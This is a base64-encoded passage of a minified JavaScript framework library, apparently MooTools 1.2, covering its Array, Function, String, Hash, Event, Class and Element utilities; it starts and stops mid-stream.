aW5lOmZ1bmN0aW9uKEMpe2Zvcih2YXIgQj0wLEE9Qy5sZW5ndGg7QjxBO0IrKyl7dGhpcy5pbmNsdWRlKENbQl0pO31yZXR1cm4gdGhpczsKfSxlcmFzZTpmdW5jdGlvbihCKXtmb3IodmFyIEE9dGhpcy5sZW5ndGg7QS0tO0Epe2lmKHRoaXNbQV09PT1CKXt0aGlzLnNwbGljZShBLDEpO319cmV0dXJuIHRoaXM7fSxlbXB0eTpmdW5jdGlvbigpe3RoaXMubGVuZ3RoPTA7cmV0dXJuIHRoaXM7fSxmbGF0dGVuOmZ1bmN0aW9uKCl7dmFyIEQ9W107CmZvcih2YXIgQj0wLEE9dGhpcy5sZW5ndGg7QjxBO0IrKyl7dmFyIEM9JHR5cGUodGhpc1tCXSk7aWYoIUMpe2NvbnRpbnVlO31EPUQuY29uY2F0KChDPT0iYXJyYXkifHxDPT0iY29sbGVjdGlvbiJ8fEM9PSJhcmd1bWVudHMiKT9BcnJheS5mbGF0dGVuKHRoaXNbQl0pOnRoaXNbQl0pOwp9cmV0dXJuIEQ7fSxoZXhUb1JnYjpmdW5jdGlvbihCKXtpZih0aGlzLmxlbmd0aCE9Myl7cmV0dXJuIG51bGw7fXZhciBBPXRoaXMubWFwKGZ1bmN0aW9uKEMpe2lmKEMubGVuZ3RoPT0xKXtDKz1DO31yZXR1cm4gQy50b0ludCgxNik7fSk7cmV0dXJuKEIpP0E6InJnYigiK0ErIikiOwp9LHJnYlRvSGV4OmZ1bmN0aW9uKEQpe2lmKHRoaXMubGVuZ3RoPDMpe3JldHVybiBudWxsO31pZih0aGlzLmxlbmd0aD09NCYmdGhpc1szXT09MCYmIUQpe3JldHVybiJ0cmFuc3BhcmVudCI7fXZhciBCPVtdO2Zvcih2YXIgQT0wO0E8MztBKyspe3ZhciBDPSh0aGlzW0FdLTApLnRvU3RyaW5nKDE2KTsKQi5wdXNoKChDLmxlbmd0aD09MSk/IjAiK0M6Qyk7fXJldHVybihEKT9COiIjIitCLmpvaW4oIiIpO319KTtGdW5jdGlvbi5pbXBsZW1lbnQoe2V4dGVuZDpmdW5jdGlvbihBKXtmb3IodmFyIEIgaW4gQSl7dGhpc1tCXT1BW0JdO31yZXR1cm4gdGhpczt9LGNyZWF0ZTpmdW5jdGlvbihCKXt2YXIgQT10aGlzOwpCPUJ8fHt9O3JldHVybiBmdW5jdGlvbihEKXt2YXIgQz1CLmFyZ3VtZW50cztDPShDIT11bmRlZmluZWQpPyRzcGxhdChDKTpBcnJheS5zbGljZShhcmd1bWVudHMsKEIuZXZlbnQpPzE6MCk7aWYoQi5ldmVudCl7Qz1bRHx8d2luZG93LmV2ZW50XS5leHRlbmQoQyk7Cn12YXIgRT1mdW5jdGlvbigpe3JldHVybiBBLmFwcGx5KEIuYmluZHx8bnVsbCxDKTt9O2lmKEIuZGVsYXkpe3JldHVybiBzZXRUaW1lb3V0KEUsQi5kZWxheSk7fWlmKEIucGVyaW9kaWNhbCl7cmV0dXJuIHNldEludGVydmFsKEUsQi5wZXJpb2RpY2FsKTt9aWYoQi5hdHRlbXB0KXtyZXR1cm4gJHRyeShFKTsKfXJldHVybiBFKCk7fTt9LHBhc3M6ZnVuY3Rpb24oQSxCKXtyZXR1cm4gdGhpcy5jcmVhdGUoe2FyZ3VtZW50czpBLGJpbmQ6Qn0pO30sYXR0ZW1wdDpmdW5jdGlvbihBLEIpe3JldHVybiB0aGlzLmNyZWF0ZSh7YXJndW1lbnRzOkEsYmluZDpCLGF0dGVtcHQ6dHJ1ZX0pKCk7Cn0sYmluZDpmdW5jdGlvbihCLEEpe3JldHVybiB0aGlzLmNyZWF0ZSh7YmluZDpCLGFyZ3VtZW50czpBfSk7fSxiaW5kV2l0aEV2ZW50OmZ1bmN0aW9uKEIsQSl7cmV0dXJuIHRoaXMuY3JlYXRlKHtiaW5kOkIsZXZlbnQ6dHJ1ZSxhcmd1bWVudHM6QX0pO30sZGVsYXk6ZnVuY3Rpb24oQixDLEEpe3JldHVybiB0aGlzLmNyZWF0ZSh7ZGVsYXk6QixiaW5kOkMsYXJndW1lbnRzOkF9KSgpOwp9LHBlcmlvZGljYWw6ZnVuY3Rpb24oQSxDLEIpe3JldHVybiB0aGlzLmNyZWF0ZSh7cGVyaW9kaWNhbDpBLGJpbmQ6Qyxhcmd1bWVudHM6Qn0pKCk7fSxydW46ZnVuY3Rpb24oQSxCKXtyZXR1cm4gdGhpcy5hcHBseShCLCRzcGxhdChBKSk7fX0pO051bWJlci5pbXBsZW1lbnQoe2xpbWl0OmZ1bmN0aW9uKEIsQSl7cmV0dXJuIE1hdGgubWluKEEsTWF0aC5tYXgoQix0aGlzKSk7Cn0scm91bmQ6ZnVuY3Rpb24oQSl7QT1NYXRoLnBvdygxMCxBfHwwKTtyZXR1cm4gTWF0aC5yb3VuZCh0aGlzKkEpL0E7fSx0aW1lczpmdW5jdGlvbihCLEMpe2Zvcih2YXIgQT0wO0E8dGhpcztBKyspe0IuY2FsbChDLEEsdGhpcyk7fX0sdG9GbG9hdDpmdW5jdGlvbigpe3JldHVybiBwYXJzZUZsb2F0KHRoaXMpOwp9LHRvSW50OmZ1bmN0aW9uKEEpe3JldHVybiBwYXJzZUludCh0aGlzLEF8fDEwKTt9fSk7TnVtYmVyLmFsaWFzKCJ0aW1lcyIsImVhY2giKTsoZnVuY3Rpb24oQil7dmFyIEE9e307Qi5lYWNoKGZ1bmN0aW9uKEMpe2lmKCFOdW1iZXJbQ10pe0FbQ109ZnVuY3Rpb24oKXtyZXR1cm4gTWF0aFtDXS5hcHBseShudWxsLFt0aGlzXS5jb25jYXQoJEEoYXJndW1lbnRzKSkpOwp9O319KTtOdW1iZXIuaW1wbGVtZW50KEEpO30pKFsiYWJzIiwiYWNvcyIsImFzaW4iLCJhdGFuIiwiYXRhbjIiLCJjZWlsIiwiY29zIiwiZXhwIiwiZmxvb3IiLCJsb2ciLCJtYXgiLCJtaW4iLCJwb3ciLCJzaW4iLCJzcXJ0IiwidGFuIl0pO1N0cmluZy5pbXBsZW1lbnQoe3Rlc3Q6ZnVuY3Rpb24oQSxCKXtyZXR1cm4oKHR5cGVvZiBBPT0ic3RyaW5nIik/bmV3IFJlZ0V4cChBLEIpOkEpLnRlc3QodGhpcyk7Cn0sY29udGFpbnM6ZnVuY3Rpb24oQSxCKXtyZXR1cm4oQik/KEIrdGhpcytCKS5pbmRleE9mKEIrQStCKT4tMTp0aGlzLmluZGV4T2YoQSk+LTE7fSx0cmltOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMucmVwbGFjZSgvXlxzK3xccyskL2csIiIpO30sY2xlYW46ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5yZXBsYWNlKC9ccysvZywiICIpLnRyaW0oKTsKfSxjYW1lbENhc2U6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5yZXBsYWNlKC8tXEQvZyxmdW5jdGlvbihBKXtyZXR1cm4gQS5jaGFyQXQoMSkudG9VcHBlckNhc2UoKTt9KTt9LGh5cGhlbmF0ZTpmdW5jdGlvbigpe3JldHVybiB0aGlzLnJlcGxhY2UoL1tBLVpdL2csZnVuY3Rpb24oQSl7cmV0dXJuKCItIitBLmNoYXJBdCgwKS50b0xvd2VyQ2FzZSgpKTsKfSk7fSxjYXBpdGFsaXplOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMucmVwbGFjZSgvXGJbYS16XS9nLGZ1bmN0aW9uKEEpe3JldHVybiBBLnRvVXBwZXJDYXNlKCk7fSk7fSxlc2NhcGVSZWdFeHA6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5yZXBsYWNlKC8oWy0uKis/XiR7fSgpfFtcXVwvXFxdKS9nLCJcXCQxIik7Cn0sdG9JbnQ6ZnVuY3Rpb24oQSl7cmV0dXJuIHBhcnNlSW50KHRoaXMsQXx8MTApO30sdG9GbG9hdDpmdW5jdGlvbigpe3JldHVybiBwYXJzZUZsb2F0KHRoaXMpO30saGV4VG9SZ2I6ZnVuY3Rpb24oQil7dmFyIEE9dGhpcy5tYXRjaCgvXiM/KFx3ezEsMn0pKFx3ezEsMn0pKFx3ezEsMn0pJC8pOwpyZXR1cm4oQSk/QS5zbGljZSgxKS5oZXhUb1JnYihCKTpudWxsO30scmdiVG9IZXg6ZnVuY3Rpb24oQil7dmFyIEE9dGhpcy5tYXRjaCgvXGR7MSwzfS9nKTtyZXR1cm4oQSk/QS5yZ2JUb0hleChCKTpudWxsO30sc3RyaXBTY3JpcHRzOmZ1bmN0aW9uKEIpe3ZhciBBPSIiOwp2YXIgQz10aGlzLnJlcGxhY2UoLzxzY3JpcHRbXj5dKj4oW1xzXFNdKj8pPFwvc2NyaXB0Pi9naSxmdW5jdGlvbigpe0ErPWFyZ3VtZW50c1sxXSsiXG4iO3JldHVybiIiO30pO2lmKEI9PT10cnVlKXskZXhlYyhBKTt9ZWxzZXtpZigkdHlwZShCKT09ImZ1bmN0aW9uIil7QihBLEMpOwp9fXJldHVybiBDO30sc3Vic3RpdHV0ZTpmdW5jdGlvbihBLEIpe3JldHVybiB0aGlzLnJlcGxhY2UoQnx8KC9cXD9ceyhbXn1dKylcfS9nKSxmdW5jdGlvbihELEMpe2lmKEQuY2hhckF0KDApPT0iXFwiKXtyZXR1cm4gRC5zbGljZSgxKTt9cmV0dXJuKEFbQ10hPXVuZGVmaW5lZCk/QVtDXToiIjsKfSk7fX0pO0hhc2guaW1wbGVtZW50KHtoYXM6T2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eSxrZXlPZjpmdW5jdGlvbihCKXtmb3IodmFyIEEgaW4gdGhpcyl7aWYodGhpcy5oYXNPd25Qcm9wZXJ0eShBKSYmdGhpc1tBXT09PUIpe3JldHVybiBBO319cmV0dXJuIG51bGw7Cn0saGFzVmFsdWU6ZnVuY3Rpb24oQSl7cmV0dXJuKEhhc2gua2V5T2YodGhpcyxBKSE9PW51bGwpO30sZXh0ZW5kOmZ1bmN0aW9uKEEpe0hhc2guZWFjaChBLGZ1bmN0aW9uKEMsQil7SGFzaC5zZXQodGhpcyxCLEMpO30sdGhpcyk7cmV0dXJuIHRoaXM7fSxjb21iaW5lOmZ1bmN0aW9uKEEpe0hhc2guZWFjaChBLGZ1bmN0aW9uKEMsQil7SGFzaC5pbmNsdWRlKHRoaXMsQixDKTsKfSx0aGlzKTtyZXR1cm4gdGhpczt9LGVyYXNlOmZ1bmN0aW9uKEEpe2lmKHRoaXMuaGFzT3duUHJvcGVydHkoQSkpe2RlbGV0ZSB0aGlzW0FdO31yZXR1cm4gdGhpczt9LGdldDpmdW5jdGlvbihBKXtyZXR1cm4odGhpcy5oYXNPd25Qcm9wZXJ0eShBKSk/dGhpc1tBXTpudWxsOwp9LHNldDpmdW5jdGlvbihBLEIpe2lmKCF0aGlzW0FdfHx0aGlzLmhhc093blByb3BlcnR5KEEpKXt0aGlzW0FdPUI7fXJldHVybiB0aGlzO30sZW1wdHk6ZnVuY3Rpb24oKXtIYXNoLmVhY2godGhpcyxmdW5jdGlvbihCLEEpe2RlbGV0ZSB0aGlzW0FdO30sdGhpcyk7CnJldHVybiB0aGlzO30saW5jbHVkZTpmdW5jdGlvbihCLEMpe3ZhciBBPXRoaXNbQl07aWYoQT09dW5kZWZpbmVkKXt0aGlzW0JdPUM7fXJldHVybiB0aGlzO30sbWFwOmZ1bmN0aW9uKEIsQyl7dmFyIEE9bmV3IEhhc2g7SGFzaC5lYWNoKHRoaXMsZnVuY3Rpb24oRSxEKXtBLnNldChELEIuY2FsbChDLEUsRCx0aGlzKSk7Cn0sdGhpcyk7cmV0dXJuIEE7fSxmaWx0ZXI6ZnVuY3Rpb24oQixDKXt2YXIgQT1uZXcgSGFzaDtIYXNoLmVhY2godGhpcyxmdW5jdGlvbihFLEQpe2lmKEIuY2FsbChDLEUsRCx0aGlzKSl7QS5zZXQoRCxFKTt9fSx0aGlzKTtyZXR1cm4gQTt9LGV2ZXJ5OmZ1bmN0aW9uKEIsQyl7Zm9yKHZhciBBIGluIHRoaXMpe2lmKHRoaXMuaGFzT3duUHJvcGVydHkoQSkmJiFCLmNhbGwoQyx0aGlzW0FdLEEpKXtyZXR1cm4gZmFsc2U7Cn19cmV0dXJuIHRydWU7fSxzb21lOmZ1bmN0aW9uKEIsQyl7Zm9yKHZhciBBIGluIHRoaXMpe2lmKHRoaXMuaGFzT3duUHJvcGVydHkoQSkmJkIuY2FsbChDLHRoaXNbQV0sQSkpe3JldHVybiB0cnVlO319cmV0dXJuIGZhbHNlO30sZ2V0S2V5czpmdW5jdGlvbigpe3ZhciBBPVtdOwpIYXNoLmVhY2godGhpcyxmdW5jdGlvbihDLEIpe0EucHVzaChCKTt9KTtyZXR1cm4gQTt9LGdldFZhbHVlczpmdW5jdGlvbigpe3ZhciBBPVtdO0hhc2guZWFjaCh0aGlzLGZ1bmN0aW9uKEIpe0EucHVzaChCKTt9KTtyZXR1cm4gQTt9LHRvUXVlcnlTdHJpbmc6ZnVuY3Rpb24oQSl7dmFyIEI9W107Ckhhc2guZWFjaCh0aGlzLGZ1bmN0aW9uKEYsRSl7aWYoQSl7RT1BKyJbIitFKyJdIjt9dmFyIEQ7c3dpdGNoKCR0eXBlKEYpKXtjYXNlIm9iamVjdCI6RD1IYXNoLnRvUXVlcnlTdHJpbmcoRixFKTticmVhaztjYXNlImFycmF5Ijp2YXIgQz17fTtGLmVhY2goZnVuY3Rpb24oSCxHKXtDW0ddPUg7Cn0pO0Q9SGFzaC50b1F1ZXJ5U3RyaW5nKEMsRSk7YnJlYWs7ZGVmYXVsdDpEPUUrIj0iK2VuY29kZVVSSUNvbXBvbmVudChGKTt9aWYoRiE9dW5kZWZpbmVkKXtCLnB1c2goRCk7fX0pO3JldHVybiBCLmpvaW4oIiYiKTt9fSk7SGFzaC5hbGlhcyh7a2V5T2Y6ImluZGV4T2YiLGhhc1ZhbHVlOiJjb250YWlucyJ9KTsKdmFyIEV2ZW50PW5ldyBOYXRpdmUoe25hbWU6IkV2ZW50Iixpbml0aWFsaXplOmZ1bmN0aW9uKEEsRil7Rj1GfHx3aW5kb3c7dmFyIEs9Ri5kb2N1bWVudDtBPUF8fEYuZXZlbnQ7aWYoQS4kZXh0ZW5kZWQpe3JldHVybiBBO310aGlzLiRleHRlbmRlZD10cnVlO3ZhciBKPUEudHlwZTsKdmFyIEc9QS50YXJnZXR8fEEuc3JjRWxlbWVudDt3aGlsZShHJiZHLm5vZGVUeXBlPT0zKXtHPUcucGFyZW50Tm9kZTt9aWYoSi50ZXN0KC9rZXkvKSl7dmFyIEI9QS53aGljaHx8QS5rZXlDb2RlO3ZhciBNPUV2ZW50LktleXMua2V5T2YoQik7aWYoSj09ImtleWRvd24iKXt2YXIgRD1CLTExMTsKaWYoRD4wJiZEPDEzKXtNPSJmIitEO319TT1NfHxTdHJpbmcuZnJvbUNoYXJDb2RlKEIpLnRvTG93ZXJDYXNlKCk7fWVsc2V7aWYoSi5tYXRjaCgvKGNsaWNrfG1vdXNlfG1lbnUpL2kpKXtLPSghSy5jb21wYXRNb2RlfHxLLmNvbXBhdE1vZGU9PSJDU1MxQ29tcGF0Iik/Sy5odG1sOksuYm9keTsKdmFyIEk9e3g6QS5wYWdlWHx8QS5jbGllbnRYK0suc2Nyb2xsTGVmdCx5OkEucGFnZVl8fEEuY2xpZW50WStLLnNjcm9sbFRvcH07dmFyIEM9e3g6KEEucGFnZVgpP0EucGFnZVgtRi5wYWdlWE9mZnNldDpBLmNsaWVudFgseTooQS5wYWdlWSk/QS5wYWdlWS1GLnBhZ2VZT2Zmc2V0OkEuY2xpZW50WX07CmlmKEoubWF0Y2goL0RPTU1vdXNlU2Nyb2xsfG1vdXNld2hlZWwvKSl7dmFyIEg9KEEud2hlZWxEZWx0YSk/QS53aGVlbERlbHRhLzEyMDotKEEuZGV0YWlsfHwwKS8zO312YXIgRT0oQS53aGljaD09Myl8fChBLmJ1dHRvbj09Mik7dmFyIEw9bnVsbDtpZihKLm1hdGNoKC9vdmVyfG91dC8pKXtzd2l0Y2goSil7Y2FzZSJtb3VzZW92ZXIiOkw9QS5yZWxhdGVkVGFyZ2V0fHxBLmZyb21FbGVtZW50OwpicmVhaztjYXNlIm1vdXNlb3V0IjpMPUEucmVsYXRlZFRhcmdldHx8QS50b0VsZW1lbnQ7fWlmKCEoZnVuY3Rpb24oKXt3aGlsZShMJiZMLm5vZGVUeXBlPT0zKXtMPUwucGFyZW50Tm9kZTt9cmV0dXJuIHRydWU7fSkuY3JlYXRlKHthdHRlbXB0OkJyb3dzZXIuRW5naW5lLmdlY2tvfSkoKSl7TD1mYWxzZTsKfX19fXJldHVybiAkZXh0ZW5kKHRoaXMse2V2ZW50OkEsdHlwZTpKLHBhZ2U6SSxjbGllbnQ6QyxyaWdodENsaWNrOkUsd2hlZWw6SCxyZWxhdGVkVGFyZ2V0OkwsdGFyZ2V0OkcsY29kZTpCLGtleTpNLHNoaWZ0OkEuc2hpZnRLZXksY29udHJvbDpBLmN0cmxLZXksYWx0OkEuYWx0S2V5LG1ldGE6QS5tZXRhS2V5fSk7Cn19KTtFdmVudC5LZXlzPW5ldyBIYXNoKHtlbnRlcjoxMyx1cDozOCxkb3duOjQwLGxlZnQ6MzcscmlnaHQ6MzksZXNjOjI3LHNwYWNlOjMyLGJhY2tzcGFjZTo4LHRhYjo5LCJkZWxldGUiOjQ2fSk7RXZlbnQuaW1wbGVtZW50KHtzdG9wOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc3RvcFByb3BhZ2F0aW9uKCkucHJldmVudERlZmF1bHQoKTsKfSxzdG9wUHJvcGFnYXRpb246ZnVuY3Rpb24oKXtpZih0aGlzLmV2ZW50LnN0b3BQcm9wYWdhdGlvbil7dGhpcy5ldmVudC5zdG9wUHJvcGFnYXRpb24oKTt9ZWxzZXt0aGlzLmV2ZW50LmNhbmNlbEJ1YmJsZT10cnVlO31yZXR1cm4gdGhpczt9LHByZXZlbnREZWZhdWx0OmZ1bmN0aW9uKCl7aWYodGhpcy5ldmVudC5wcmV2ZW50RGVmYXVsdCl7dGhpcy5ldmVudC5wcmV2ZW50RGVmYXVsdCgpOwp9ZWxzZXt0aGlzLmV2ZW50LnJldHVyblZhbHVlPWZhbHNlO31yZXR1cm4gdGhpczt9fSk7dmFyIENsYXNzPW5ldyBOYXRpdmUoe25hbWU6IkNsYXNzIixpbml0aWFsaXplOmZ1bmN0aW9uKEIpe0I9Qnx8e307dmFyIEE9ZnVuY3Rpb24oRSl7Zm9yKHZhciBEIGluIHRoaXMpe3RoaXNbRF09JHVubGluayh0aGlzW0RdKTsKfWZvcih2YXIgRiBpbiBDbGFzcy5NdXRhdG9ycyl7aWYoIXRoaXNbRl0pe2NvbnRpbnVlO31DbGFzcy5NdXRhdG9yc1tGXSh0aGlzLHRoaXNbRl0pO2RlbGV0ZSB0aGlzW0ZdO310aGlzLmNvbnN0cnVjdG9yPUE7aWYoRT09PSRlbXB0eSl7cmV0dXJuIHRoaXM7fXZhciBDPSh0aGlzLmluaXRpYWxpemUpP3RoaXMuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLGFyZ3VtZW50cyk6dGhpczsKaWYodGhpcy5vcHRpb25zJiZ0aGlzLm9wdGlvbnMuaW5pdGlhbGl6ZSl7dGhpcy5vcHRpb25zLmluaXRpYWxpemUuY2FsbCh0aGlzKTt9cmV0dXJuIEM7fTskZXh0ZW5kKEEsdGhpcyk7QS5jb25zdHJ1Y3Rvcj1DbGFzcztBLnByb3RvdHlwZT1CO3JldHVybiBBO319KTsKQ2xhc3MuaW1wbGVtZW50KHtpbXBsZW1lbnQ6ZnVuY3Rpb24oKXtDbGFzcy5NdXRhdG9ycy5JbXBsZW1lbnRzKHRoaXMucHJvdG90eXBlLEFycmF5LnNsaWNlKGFyZ3VtZW50cykpO3JldHVybiB0aGlzO319KTtDbGFzcy5NdXRhdG9ycz17SW1wbGVtZW50czpmdW5jdGlvbihBLEIpeyRzcGxhdChCKS5lYWNoKGZ1bmN0aW9uKEMpeyRleHRlbmQoQSwoJHR5cGUoQyk9PSJjbGFzcyIpP25ldyBDKCRlbXB0eSk6Qyk7Cn0pO30sRXh0ZW5kczpmdW5jdGlvbihzZWxmLGtsYXNzKXt2YXIgaW5zdGFuY2U9bmV3IGtsYXNzKCRlbXB0eSk7ZGVsZXRlIGluc3RhbmNlLnBhcmVudDtkZWxldGUgaW5zdGFuY2UucGFyZW50T2Y7Zm9yKHZhciBrZXkgaW4gaW5zdGFuY2Upe3ZhciBjdXJyZW50PXNlbGZba2V5XSxwcmV2aW91cz1pbnN0YW5jZVtrZXldOwppZihjdXJyZW50PT11bmRlZmluZWQpe3NlbGZba2V5XT1wcmV2aW91cztjb250aW51ZTt9dmFyIGN0eXBlPSR0eXBlKGN1cnJlbnQpLHB0eXBlPSR0eXBlKHByZXZpb3VzKTtpZihjdHlwZSE9cHR5cGUpe2NvbnRpbnVlO31zd2l0Y2goY3R5cGUpe2Nhc2UiZnVuY3Rpb24iOmlmKCFhcmd1bWVudHMuY2FsbGVlLmNhbGxlcil7c2VsZltrZXldPWV2YWwoIigiK1N0cmluZyhjdXJyZW50KS5yZXBsYWNlKC9cYnRoaXNcLnBhcmVudFwoXHMqKFwpKT8vZyxmdW5jdGlvbihmdWxsLGNsb3NlKXtyZXR1cm4iYXJndW1lbnRzLmNhbGxlZS5fcGFyZW50Xy5jYWxsKHRoaXMiKyhjbG9zZXx8IiwgIik7Cn0pKyIpIik7fXNlbGZba2V5XS5fcGFyZW50Xz1wcmV2aW91czticmVhaztjYXNlIm9iamVjdCI6c2VsZltrZXldPSRtZXJnZShwcmV2aW91cyxjdXJyZW50KTt9fXNlbGYucGFyZW50PWZ1bmN0aW9uKCl7cmV0dXJuIGFyZ3VtZW50cy5jYWxsZWUuY2FsbGVyLl9wYXJlbnRfLmFwcGx5KHRoaXMsYXJndW1lbnRzKTsKfTtzZWxmLnBhcmVudE9mPWZ1bmN0aW9uKGRlc2NlbmRhbnQpe3JldHVybiBkZXNjZW5kYW50Ll9wYXJlbnRfLmFwcGx5KHRoaXMsQXJyYXkuc2xpY2UoYXJndW1lbnRzLDEpKTt9O319O3ZhciBDaGFpbj1uZXcgQ2xhc3Moe2NoYWluOmZ1bmN0aW9uKCl7dGhpcy4kY2hhaW49KHRoaXMuJGNoYWlufHxbXSkuZXh0ZW5kKGFyZ3VtZW50cyk7CnJldHVybiB0aGlzO30sY2FsbENoYWluOmZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMuJGNoYWluJiZ0aGlzLiRjaGFpbi5sZW5ndGgpP3RoaXMuJGNoYWluLnNoaWZ0KCkuYXBwbHkodGhpcyxhcmd1bWVudHMpOmZhbHNlO30sY2xlYXJDaGFpbjpmdW5jdGlvbigpe2lmKHRoaXMuJGNoYWluKXt0aGlzLiRjaGFpbi5lbXB0eSgpOwp9cmV0dXJuIHRoaXM7fX0pO3ZhciBFdmVudHM9bmV3IENsYXNzKHthZGRFdmVudDpmdW5jdGlvbihDLEIsQSl7Qz1FdmVudHMucmVtb3ZlT24oQyk7aWYoQiE9JGVtcHR5KXt0aGlzLiRldmVudHM9dGhpcy4kZXZlbnRzfHx7fTt0aGlzLiRldmVudHNbQ109dGhpcy4kZXZlbnRzW0NdfHxbXTsKdGhpcy4kZXZlbnRzW0NdLmluY2x1ZGUoQik7aWYoQSl7Qi5pbnRlcm5hbD10cnVlO319cmV0dXJuIHRoaXM7fSxhZGRFdmVudHM6ZnVuY3Rpb24oQSl7Zm9yKHZhciBCIGluIEEpe3RoaXMuYWRkRXZlbnQoQixBW0JdKTt9cmV0dXJuIHRoaXM7fSxmaXJlRXZlbnQ6ZnVuY3Rpb24oQyxCLEEpe0M9RXZlbnRzLnJlbW92ZU9uKEMpOwppZighdGhpcy4kZXZlbnRzfHwhdGhpcy4kZXZlbnRzW0NdKXtyZXR1cm4gdGhpczt9dGhpcy4kZXZlbnRzW0NdLmVhY2goZnVuY3Rpb24oRCl7RC5jcmVhdGUoe2JpbmQ6dGhpcyxkZWxheTpBLCJhcmd1bWVudHMiOkJ9KSgpO30sdGhpcyk7cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudDpmdW5jdGlvbihCLEEpe0I9RXZlbnRzLnJlbW92ZU9uKEIpOwppZighdGhpcy4kZXZlbnRzfHwhdGhpcy4kZXZlbnRzW0JdKXtyZXR1cm4gdGhpczt9aWYoIUEuaW50ZXJuYWwpe3RoaXMuJGV2ZW50c1tCXS5lcmFzZShBKTt9cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudHM6ZnVuY3Rpb24oQyl7Zm9yKHZhciBEIGluIHRoaXMuJGV2ZW50cyl7aWYoQyYmQyE9RCl7Y29udGludWU7Cn12YXIgQj10aGlzLiRldmVudHNbRF07Zm9yKHZhciBBPUIubGVuZ3RoO0EtLTtBKXt0aGlzLnJlbW92ZUV2ZW50KEQsQltBXSk7fX1yZXR1cm4gdGhpczt9fSk7RXZlbnRzLnJlbW92ZU9uPWZ1bmN0aW9uKEEpe3JldHVybiBBLnJlcGxhY2UoL15vbihbQS1aXSkvLGZ1bmN0aW9uKEIsQyl7cmV0dXJuIEMudG9Mb3dlckNhc2UoKTsKfSk7fTt2YXIgT3B0aW9ucz1uZXcgQ2xhc3Moe3NldE9wdGlvbnM6ZnVuY3Rpb24oKXt0aGlzLm9wdGlvbnM9JG1lcmdlLnJ1bihbdGhpcy5vcHRpb25zXS5leHRlbmQoYXJndW1lbnRzKSk7aWYoIXRoaXMuYWRkRXZlbnQpe3JldHVybiB0aGlzO31mb3IodmFyIEEgaW4gdGhpcy5vcHRpb25zKXtpZigkdHlwZSh0aGlzLm9wdGlvbnNbQV0pIT0iZnVuY3Rpb24ifHwhKC9eb25bQS1aXS8pLnRlc3QoQSkpe2NvbnRpbnVlOwp9dGhpcy5hZGRFdmVudChBLHRoaXMub3B0aW9uc1tBXSk7ZGVsZXRlIHRoaXMub3B0aW9uc1tBXTt9cmV0dXJuIHRoaXM7fX0pO0RvY3VtZW50LmltcGxlbWVudCh7bmV3RWxlbWVudDpmdW5jdGlvbihBLEIpe2lmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQmJkIpe1sibmFtZSIsInR5cGUiLCJjaGVja2VkIl0uZWFjaChmdW5jdGlvbihDKXtpZighQltDXSl7cmV0dXJuIDsKfUErPSIgIitDKyc9IicrQltDXSsnIic7aWYoQyE9ImNoZWNrZWQiKXtkZWxldGUgQltDXTt9fSk7QT0iPCIrQSsiPiI7fXJldHVybiAkLmVsZW1lbnQodGhpcy5jcmVhdGVFbGVtZW50KEEpKS5zZXQoQik7fSxuZXdUZXh0Tm9kZTpmdW5jdGlvbihBKXtyZXR1cm4gdGhpcy5jcmVhdGVUZXh0Tm9kZShBKTsKfSxnZXREb2N1bWVudDpmdW5jdGlvbigpe3JldHVybiB0aGlzO30sZ2V0V2luZG93OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZGVmYXVsdFZpZXd8fHRoaXMucGFyZW50V2luZG93O30scHVyZ2U6ZnVuY3Rpb24oKXt2YXIgQz10aGlzLmdldEVsZW1lbnRzQnlUYWdOYW1lKCIqIik7CmZvcih2YXIgQj0wLEE9Qy5sZW5ndGg7QjxBO0IrKyl7QnJvd3Nlci5mcmVlTWVtKENbQl0pO319fSk7dmFyIEVsZW1lbnQ9bmV3IE5hdGl2ZSh7bmFtZToiRWxlbWVudCIsbGVnYWN5OndpbmRvdy5FbGVtZW50LGluaXRpYWxpemU6ZnVuY3Rpb24oQSxCKXt2YXIgQz1FbGVtZW50LkNvbnN0cnVjdG9ycy5nZXQoQSk7CmlmKEMpe3JldHVybiBDKEIpO31pZih0eXBlb2YgQT09InN0cmluZyIpe3JldHVybiBkb2N1bWVudC5uZXdFbGVtZW50KEEsQik7fXJldHVybiAkKEEpLnNldChCKTt9LGFmdGVySW1wbGVtZW50OmZ1bmN0aW9uKEEsQil7aWYoIUFycmF5W0FdKXtFbGVtZW50cy5pbXBsZW1lbnQoQSxFbGVtZW50cy5tdWx0aShBKSk7Cn1FbGVtZW50LlByb3RvdHlwZVtBXT1CO319KTtFbGVtZW50LlByb3RvdHlwZT17JGZhbWlseTp7bmFtZToiZWxlbWVudCJ9fTtFbGVtZW50LkNvbnN0cnVjdG9ycz1uZXcgSGFzaDt2YXIgSUZyYW1lPW5ldyBOYXRpdmUoe25hbWU6IklGcmFtZSIsZ2VuZXJpY3M6ZmFsc2UsaW5pdGlhbGl6ZTpmdW5jdGlvbigpe3ZhciBFPUFycmF5LmxpbmsoYXJndW1lbnRzLHtwcm9wZXJ0aWVzOk9iamVjdC50eXBlLGlmcmFtZTokZGVmaW5lZH0pOwp2YXIgQz1FLnByb3BlcnRpZXN8fHt9O3ZhciBCPSQoRS5pZnJhbWUpfHxmYWxzZTt2YXIgRD1DLm9ubG9hZHx8JGVtcHR5O2RlbGV0ZSBDLm9ubG9hZDtDLmlkPUMubmFtZT0kcGljayhDLmlkLEMubmFtZSxCLmlkLEIubmFtZSwiSUZyYW1lXyIrJHRpbWUoKSk7Qj1uZXcgRWxlbWVudChCfHwiaWZyYW1lIixDKTsKdmFyIEE9ZnVuY3Rpb24oKXt2YXIgRj0kdHJ5KGZ1bmN0aW9uKCl7cmV0dXJuIEIuY29udGVudFdpbmRvdy5sb2NhdGlvbi5ob3N0O30pO2lmKEYmJkY9PXdpbmRvdy5sb2NhdGlvbi5ob3N0KXt2YXIgSD1uZXcgV2luZG93KEIuY29udGVudFdpbmRvdyk7dmFyIEc9bmV3IERvY3VtZW50KEIuY29udGVudFdpbmRvdy5kb2N1bWVudCk7CiRleHR